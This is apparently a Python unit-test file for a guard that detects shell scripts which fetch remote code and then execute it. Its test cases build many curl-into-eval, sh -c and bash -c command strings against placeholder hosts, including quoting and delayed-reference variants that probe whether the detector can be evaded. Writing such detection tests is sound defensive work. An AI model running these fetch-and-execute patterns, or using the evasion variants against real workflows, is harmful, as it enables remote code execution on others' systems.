"""#2433: a prefix assignment is applied after its command words expand."""
import unittest

import shell_reader
import workflow_guard as guard


URL = "https://example.test/i.sh"
OLD = "https://old.example.test/old.sh"
NEW = "https://new.example.test/new.sh"


def fetch(url=URL):
    return "$(curl -fsSL %s)" % url


class TestAPrefixAssignmentDoesNotFeedItsCommandsExpansions(unittest.TestCase):

    def defects(self, script):
        return guard.fetch_exec_defects(script)

    def test_the_reader_keeps_the_outer_quotes_around_embedded_references(self):
        cases = (
            ('eval "echo $x"', True),
            ("eval 'echo $x'", False),
            ('bash -c "eval \'$x\'"', True),
            ("bash -c 'eval \"$x\"'", False),
        )
        for script, live in cases:
            with self.subTest(script=script):
                word = shell_reader.statements(script)[0].stages[0].argv[-1]
                self.assertEqual(live, word.live_dollar)

        words = shell_reader.statements('eval "$x" \'$x\'')[0].stages[0].argv[-2:]
        self.assertEqual([True, False], [word.live_dollar for word in words])

    def test_a_live_reference_expands_before_the_prefix_assignment(self):
        cases = (
            'x=%s eval "$x"' % fetch(),
            "x=%s eval $x" % fetch(),
            'x=%s eval "${x}"' % fetch(),
            'x=%s eval "echo $x"' % fetch(),
            'x=%s eval a"$x"' % fetch(),
            'x=%s sh -c "$x"' % fetch(),
            'x=%s bash -c "${x}"' % fetch(),
            'x=%s bash -c "eval \'$x\'"' % fetch(),
        )
        for script in cases:
            with self.subTest(script=script):
                self.assertEqual([], self.defects(script))

    def test_the_prefix_does_not_outlive_an_ordinary_command(self):
        for command in ("true", "printf done"):
            script = 'x=%s %s; eval "$x"' % (fetch(), command)
            with self.subTest(command=command):
                self.assertEqual([], self.defects(script))

    def test_a_posix_special_builtin_can_keep_the_prefix_for_a_later_command(self):
        cases = (
            'x=%s eval "$x"; eval "$x"' % fetch(),
            'x=%s :; eval "$x"' % fetch(),
            'x=%s export y=1; sh -c "$x"' % fetch(),
        )
        for script in cases:
            with self.subTest(script=script):
                why = self.defects(script)
                carried = [reason for reason in why if "carries %s in `$x`" % URL in reason]
                self.assertEqual(1, len(carried), why)

    def test_a_wrapper_or_the_special_builtin_can_discard_the_prefix(self):
        cases = (
            'x=%s command eval "$x"; eval "$x"' % fetch(),
            'x=%s unset x; eval "$x"' % fetch(),
            'x=%s export x=:; eval "$x"' % fetch(),
        )
        for script in cases:
            with self.subTest(script=script):
                self.assertEqual([], self.defects(script))

    def test_a_delayed_reference_reads_the_prefix_value(self):
        cases = (
            "x=%s eval '$x'" % fetch(),
            "x=%s sh -c '$x'" % fetch(),
            "x=%s bash -c 'eval \"$x\"'" % fetch(),
            'x=%s eval "$x" \'$x\'' % fetch(),
            'x=%s eval \'$x\' "$x"' % fetch(),
            r"x=%s eval \$x" % fetch(),
            r'x=%s sh -c "\$x"' % fetch(),
        )
        for script in cases:
            with self.subTest(script=script):
                why = self.defects(script)
                direct = [reason for reason in why if URL in reason and "straight to" in reason]
                self.assertEqual(1, len(direct), why)

    def test_an_assignment_only_command_still_carries_its_value(self):
        for program in ('"$x"', '"echo $x"'):
            with self.subTest(program=program):
                why = self.defects("x=%s; eval %s" % (fetch(), program))
                carried = [reason for reason in why if "carries %s in `$x`" % URL in reason]
                self.assertEqual(1, len(carried), why)

    def test_a_new_prefix_value_does_not_replace_the_old_live_value(self):
        script = 'x=%s; x=%s eval "$x"' % (fetch(OLD), fetch(NEW))
        why = self.defects(script)
        self.assertEqual(1, len(why), why)
        self.assertIn("carries %s in `$x`" % OLD, why[0])
        self.assertNotIn(NEW, why[0])

    def test_a_delayed_reference_reads_the_new_value_instead_of_the_old_one(self):
        script = "x=%s; x=%s eval '$x'" % (fetch(OLD), fetch(NEW))
        why = self.defects(script)
        self.assertEqual(1, len(why), why)
        self.assertIn(NEW, why[0])
        self.assertNotIn(OLD, why[0])

    def test_an_append_keeps_the_value_that_stood_before_the_command(self):
        script = "x=%s; x+=: eval '$x'" % fetch(OLD)
        why = self.defects(script)
        self.assertEqual(1, len(why), why)
        self.assertIn("carries %s in `$x`" % OLD, why[0])

    def test_only_the_last_replacing_prefix_assignment_can_feed_a_delayed_reference(self):
        script = "x=%s x=%s eval '$x'" % (fetch(OLD), fetch(NEW))
        why = self.defects(script)
        direct = [reason for reason in why if "straight to" in reason]
        self.assertEqual(1, len(direct), why)
        self.assertIn(NEW, direct[0])
        self.assertNotIn(OLD, direct[0])

    def test_a_program_that_does_not_read_the_name_cannot_receive_its_fetch(self):
        self.assertEqual([], self.defects("x=%s eval true" % fetch()))

    def test_an_unrelated_dynamic_program_stays_fail_closed(self):
        why = self.defects("x=%s eval '$y'" % fetch())
        self.assertEqual(1, len(why), why)
        self.assertIn("a program this guard does not follow", why[0])
        self.assertNotIn("straight to", why[0])

    def test_an_executor_without_a_shell_string_stays_fail_closed(self):
        for command in ("sh", "python3 -c pass", "install safe /tmp/safe"):
            with self.subTest(command=command):
                why = self.defects("x=%s %s" % (fetch(), command))
                self.assertEqual(1, len(why), why)
                self.assertIn(URL, why[0])
                self.assertIn("straight to", why[0])

    def test_source_does_not_reparse_a_literal_reference(self):
        for word in ('"$x"', "'$x'"):
            with self.subTest(word=word):
                self.assertEqual([], self.defects("x=%s source %s" % (fetch(), word)))

    def test_a_second_prefix_assignment_does_not_change_the_order(self):
        for assignments in (
            "x=%s y=$(date)" % fetch(),
            "y=$(date) x=%s" % fetch(),
        ):
            with self.subTest(assignments=assignments):
                self.assertEqual([], self.defects(assignments + ' eval "$x"'))

    def test_a_direct_substitution_in_the_program_remains_a_must_trip(self):
        direct = "https://direct.example.test/direct.sh"
        script = 'x=%s eval "$(curl -fsSL %s)"' % (fetch(), direct)
        why = self.defects(script)
        self.assertEqual(1, len(why), why)
        self.assertIn(direct, why[0])
        self.assertNotIn(URL, why[0])


if __name__ == "__main__":
    unittest.main()
